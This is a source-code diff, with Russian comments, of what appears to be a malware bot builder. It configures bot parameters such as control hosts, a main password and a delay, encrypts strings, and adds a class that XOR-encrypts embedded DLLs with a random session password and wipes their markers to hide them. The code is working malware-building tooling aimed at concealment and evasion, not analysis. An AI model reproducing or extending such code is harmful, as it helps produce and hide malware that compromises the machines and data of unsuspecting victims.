@@ -120,7 +120,7 @@ bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
 		if (CryptLines)
 		{
 			Line = STR::Alloc(SL);
-			Decrypt(AnsiString(S).c_str(), Line);
+			DecryptStr(AnsiString(S).c_str(), Line);
 		}
 		else
 			Line = AnsiString(S).c_str();
@@ -164,6 +164,7 @@ TBotParam::TBotParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encr
 	: TObject()
 {
 	FIsDynamic = false;
+	FIsSessional = false;
 	FTitle = Title;
 	FPosition = -1;
 	FEnabled = true;
@@ -294,6 +295,16 @@ bool TBotParam::GetActive()
 	return FEnabled && (FPosition >= 0);
 }
 
+//--------------------------------------------------
+//  Функция возвращает истину если парметр
+//  динамический
+//--------------------------------------------------
+bool TBotParam::GetIsDynamic()
+{
+	return FIsDynamic || FIsSessional;
+}
+
+
 
 //--------------------------------------------------
 //  Функция возвращает состояние значения парметра
@@ -328,7 +339,7 @@ void TBotParam::SetValue(LPVOID Data, DWORD Size, bool Encrypt)
 	m_memcpy(FData, Data, Size);
 	FDataSize = Size;
 	if (Encrypt)
-		Decrypt(FData, FData);
+		DecryptStr(FData, FData);
 }
 
 //--------------------------------------------------
@@ -338,7 +349,7 @@ AnsiString TBotParam::GetAsString()
 {
 	AnsiString S = (PCHAR)FData;
 	if (FEncrypted)
-		Decrypt(S.c_str(), S.c_str());
+		DecryptStr(S.c_str(), S.c_str());
 	return S;
 }
 
@@ -397,7 +408,7 @@ void TBotParam::SetAsMultiLine(const AnsiString& Value)
 
 			// Шифруем строку
 			if (FEncrypted)
-				Decrypt(Str.c_str(), Str.c_str());
+				DecryptStr(Str.c_str(), Str.c_str());
 
 			// Копируем данные
 			m_memcpy(Tmp, Str.c_str(), Len);
@@ -455,7 +466,7 @@ void TBotParam::SetAsBool(bool Value)
 //  Функция проверяет правильно ли записался параметр
 //  в буфер
 //--------------------------------------------------
-bool TBotParam::CheckParam(LPBYTE Buf)
+bool TBotParam::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 {
 
 	if (FPosition < 0)
@@ -478,12 +489,12 @@ bool TBotParam::CheckParam(LPBYTE Buf)
 //*****************************************************************
 //  Класс основного пароля бота
 //*****************************************************************
-TCustomPassword::TCustomPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
+TMainPassword::TMainPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
 	:TBotParam(AOwner, Name, Size, Encrypted, NotNull, Title)
 {
 
 }
-__fastcall TCustomPassword::~TCustomPassword()
+__fastcall TMainPassword::~TMainPassword()
 {
 
 }
@@ -491,7 +502,7 @@ __fastcall TCustomPassword::~TCustomPassword()
 //--------------------------------------------------
 //  Функция возвращает пароль в зашифрованном виде
 //--------------------------------------------------
-AnsiString TCustomPassword::GetAsString()
+AnsiString TMainPassword::GetAsString()
 {
 	return FPassword;
 }
@@ -499,7 +510,7 @@ AnsiString TCustomPassword::GetAsString()
 //--------------------------------------------------
 //  Функция устанавливает пароль в зашифрованном виде
 //--------------------------------------------------
-void TCustomPassword::SetAsString(const AnsiString& Value)
+void TMainPassword::SetAsString(const AnsiString& Value)
 {
 	FPassword = Value;
 
@@ -517,7 +528,7 @@ void TCustomPassword::SetAsString(const AnsiString& Value)
 //--------------------------------------------------
 //  Функция устанавливает пароль в зашифрованном виде
 //--------------------------------------------------
-void TCustomPassword::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
+void TMainPassword::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
 {
 	inherited::DoSaveToStream(Stream, FPassword.c_str(), FPassword.Length());
 }
@@ -525,7 +536,7 @@ void TCustomPassword::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
 //--------------------------------------------------
 //  Функция устанавливает пароль в зашифрованном виде
 //--------------------------------------------------
-void TCustomPassword::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
+void TMainPassword::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
 {
 	inherited::DoLoadFromStream(Stream, Buf, Size);
 
@@ -600,6 +611,21 @@ void TCustomBotModule::Clear()
 		delete Param;
 	}
 }
+
+
+//--------------------------------------------------
+//  Функция очищает сессинные параметры
+//--------------------------------------------------
+void TCustomBotModule::ClearSessionParams()
+{
+	for (int i = FItems->Count - 1; i >= 0 ; i--)
+	{
+		TBotParam* Param = (TBotParam*)FItems->Items[i];
+		if (Param->IsSessional)
+			delete Param;
+	}
+}
+
 
 //--------------------------------------------------
 //  Функция возвращает количество параметров модуля
@@ -774,7 +800,7 @@ __fastcall TBaseBotModule::TBaseBotModule(TComponent* AOwner)
 	FPrefix    = new TBotParam(this, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, true, true, ParamTitle_Prefix);
 	FHosts     = new TBotParam(this, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, true, true, ParamTitle_Hosts);
 	FDelay     = new TBotParam(this, BOTPARAM_DELAY, MAX_DELAY_SIZE, false, true, ParamTitle_Delay);
-	FPassword  = new TCustomPassword(this, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, true, true, ParamTitle_Password);
+	FPassword  = new TMainPassword(this, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, true, true, ParamTitle_Password);
 
 	FDelay->AsLong = DEFAULT_DELAY;
 }
@@ -846,6 +872,7 @@ bool TBaseBotModule::Build(bool FullBuild)
     if (!Buf) return false;
 
 	// Собираем билд
+	DoBeforeBuild(Buf, Size);
 	bool Result = WriteParams(Buf, Size);
 
 	// Сохраняем результат
@@ -943,6 +970,7 @@ __fastcall TBotBuilder::TBotBuilder(TComponent *AOwner)
 	: TBaseBotModule(AOwner)
 {
 	FModules = new TList();
+	FEncryptDlls = true;
 
     // Создаём парамт пароля шифрования строк
 	FSessionPassword = new TBotParam(this, BOTPARAM_SESSION_PASSW, MAX_SESSION_PASSW_SIZE, false, false, "");
@@ -1031,6 +1059,8 @@ void TBotBuilder::SaveToStream(TStream *Stream)
 	for (int i = 0; i < Count; i++)
 	{
 		TBotParam* P = Items[i];
+		if (P->IsDynamic) continue;
+
 		DWORD NameLen = P->Name.Length();
 
 		// Записываем имя парамера
@@ -1038,7 +1068,7 @@ void TBotBuilder::SaveToStream(TStream *Stream)
 
 		AnsiString Name = P->Name;
 		Name.Unique();
-		Decrypt(Name.c_str(), Name.c_str());
+		DecryptStr(Name.c_str(), Name.c_str());
 
 		Stream->Write(Name.c_str(), NameLen);
 
@@ -1078,7 +1108,7 @@ void TBotBuilder::LoadFromStream(TStream *Stream)
 		if (Readed != NameLen)
 			throw Exception(Error_InvalidParamsFile);
 
-		Decrypt(Name.c_str(), Name.c_str());
+		DecryptStr(Name.c_str(), Name.c_str());
 
 		// Читаем данные параметра
 		TBotParam* Param = ParamByName(Name);
@@ -1180,9 +1210,70 @@ bool TBotBuilder::Build(bool FullBuild)
 	// Создаём сесионный пароль
 	FSessionPassword->AsString = Random::RandomString2(MAX_SESSION_PASSW_SIZE - 1, 'a', 'z').t_str();
 
+	// Очищаем сессионные параметры
+	ClearSessionParams();
+
+
+    // Создаём сборку
 	return inherited::Build(FullBuild);
 }
 
+//--------------------------------------------------
+//  Инициализируем сессионные параметры
+//--------------------------------------------------
+void TBotBuilder::DoBeforeBuild(LPBYTE Buf, DWORD BufSize)
+{
+	// Инициализируем параметры шифрования DLL
+	InitializeDLLsEncryptors(Buf, BufSize);
+}
+
+
+//--------------------------------------------------
+//  Функция инициализирует параметры шифрования DLL
+//--------------------------------------------------
+void TBotBuilder::InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize)
+{
+	if (!EncryptDlls) return;
+
+	while (true)
+	{
+		// Определяем позицию DLL в буфере
+		int Pos = STR::Pos(Buf, ENCRYPTED_DLL_MARKER, BufSize, true);
+		if (Pos < 0) break;
+
+		// Запоминаем начало маркера
+		PCHAR MarkerPtr = Buf + Pos;
+
+		// Определяем позицию относительно всего буфера
+		int GlobalPos = MarkerPtr - Buf;
+
+		// Переходим к длл
+		Buf     += Pos + ENCRYPTED_DLL_MARKER_SIZE;
+		BufSize -= Pos + ENCRYPTED_DLL_MARKER_SIZE;
+
+		// Определяем размер данных
+		DWORD DllSize = *(PDWORD)Buf;
+
+		// Пропускаем данные о размере
+		Buf     += sizeof(DWORD);
+		BufSize -= sizeof(DWORD);
+
+		if (DllSize > BufSize)
+			throw Exception("Нарушение целостности встроенных DLL!\r\nОбратитесь к разработчикам!");
+
+
+		// Пропускаем длл
+		Buf     += DllSize;
+		BufSize -= DllSize;
+
+		// Создаём элемент
+		DWORD TotalSize = Buf - MarkerPtr;
+		TBotDLLEncryptor *Item = new TBotDLLEncryptor(this, GlobalPos, TotalSize);
+		Item->Password = FSessionPassword;
+	}
+
+
+}
 
 //--------------------------------------------------
 //  Функция возвращает естину если включено
@@ -1638,7 +1729,7 @@ void __fastcall TOldBotParam::SetValue(PCHAR Value, DWORD ValueSize)
 		m_memcpy(FData, Value, ValueSize);
 		FDataSize = ValueSize;
 		if (FEncrypted)
-            Decrypt(FData, FData);
+            DecryptStr(FData, FData);
 	}
 
 	Changed();
@@ -1665,7 +1756,7 @@ AnsiString __fastcall TOldBotParam::GetAsAnsiString()
 {
 	AnsiString S = FData;
 	if (FEncrypted)
-		Decrypt(S.c_str(), S.c_str());
+		DecryptStr(S.c_str(), S.c_str());
 	return S;
 }
 //-----------------------------------------------------------------------------
@@ -1774,7 +1865,7 @@ void __fastcall TOldBotParam::LoadFromStrings(TStrings *Strings)
 
 		// При необходимости шифруем строку
 		if (FEncrypted)
-			Decrypt(S.c_str(), S.c_str());
+			DecryptStr(S.c_str(), S.c_str());
 
 		// Копируем данные
 		m_memcpy(Buf, S.c_str(), Len);
@@ -1831,14 +1922,25 @@ bool __fastcall TOldBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWO
 
 */
 
+//*************************************************************
+//  TCustomBotDataEncryptor  - Базовый Класс шифрования
+//							   данных бота
+//*************************************************************
+TCustomBotDataEncryptor::TCustomBotDataEncryptor(TCustomBotModule* AOwner, PCHAR Name, DWORD Size)
+	: TBotParam(AOwner, Name, Size, false, false, NULL)
+{
+    IsDynamic = true;
+}
+
+
 
 //*****************************************************************************
 //   						TBotStringsCryptor
 //*****************************************************************************
 __fastcall TBotStringsEncryptor::TBotStringsEncryptor(TCustomBotModule* AOwner)
-	: TBotParam(AOwner, "STRINGS_ENCRYPTOR", 0, false, false, "Шифрованные строки")
+	: TCustomBotDataEncryptor(AOwner, "STRINGS_ENCRYPTOR", 0)
 {
-    IsDynamic = true;
+
 }
 //---------------------------------------------------------------------------
 
@@ -1942,6 +2044,86 @@ bool TBotStringsEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 //---------------------------------------------------------------------------
 
 
+//*************************************************************
+//   TBotDLLEncryptor  - Класс шифрования интегрированных
+//                       DLL бота
+//*************************************************************
+TBotDLLEncryptor::TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWORD ASize)
+	: TCustomBotDataEncryptor(AOwner, "DLL_ENCRYPTOR", ASize)
+{
+	FPosition = APosition;
+	IsSessional = true;
+	FDllSize = 0;
+}
+
+//--------------------------------------------------
+//  Функция зашифровывает данные длл
+//--------------------------------------------------
+bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
+{
+	AnsiString Pass = Password->AsString;
+
+	PCHAR Ptr = Buf + Position;
+	PCHAR Marker = Ptr;
+
+	// Проверяем маркер
+	DWORD Hash = STRA::Hash(Ptr, ENCRYPTED_DLL_MARKER_SIZE, false);
+
+	if (Hash != ENCRYPTED_DLL_MARKER_HASH)
+		throw Exception("Во время шифрования интегрированных dll возникла ошибка!");
+
+	// Получаем размер длл
+	Ptr += ENCRYPTED_DLL_MARKER_SIZE;
+	FDllSize = *(PDWORD)Ptr;
+	Ptr += sizeof(DWORD);
+
+	// Шифруем данные
+   	XORCrypt::Crypt(Pass.c_str(), (LPBYTE)Ptr, FDllSize);
+
+	// Прячем маркер
+	m_memset(Marker, 0, ENCRYPTED_DLL_MARKER_SIZE);
+
+	return true;
+}
+
+//--------------------------------------------------
+//  Проверяем корректность шифрования длл
+//--------------------------------------------------
+bool TBotDLLEncryptor::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
+{
+	if (FPosition < 0 || FDllSize == 0)
+		return false;
+
+	AnsiString Pass = Password->AsString;
+
+	// Расшифровываем библиотеку
+	DWORD Size = 0;
+	LPVOID DllBuf = NULL;
+	bool BufAllocated = false;
+	if (!TMemoryDLL::DecodeDllByPass(Pass.c_str(), Buf + Position, Size, DllBuf, BufAllocated))
+		return false;
+
+	// Сравниваем размеры
+	bool Result = FDllSize == Size;
+
+	// Сравниваем содержимое
+	if (Result)
+	{
+		OriginalBuf += Position + ENCRYPTED_DLL_MARKER_SIZE + sizeof(DWORD);
+		Result = m_memcmp(DllBuf, OriginalBuf, Size) == 0;
+    }
+
+	if (BufAllocated)
+		MemFree(DllBuf);
+    return Result;
+}
+
+
+
+
+
+
+
 
 //*************************************************************
 //   TBuildChecker  - Класс проверки результата сборки
@@ -2005,11 +2187,11 @@ bool TBuildChecker::CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Resul
 		}
 
 		// Проверяем валидность параметра
-		if (!Param->CheckParam(Result))
+		if (!Param->CheckParam(Result, Source))
 		{
-			UnicodeString FileName = "c:\\Test\\Params\\";
-			FileName += Param->Name + ".log";
-			File::WriteBufferW(FileName.w_str(), &Result[Pos], Param->Size);
+//			UnicodeString FileName = "c:\\Test\\Params\\";
+//			FileName += Param->Name + ".log";
+//			File::WriteBufferW(FileName.w_str(), &Result[Pos], Param->Size);
 			return false;
 		}
 
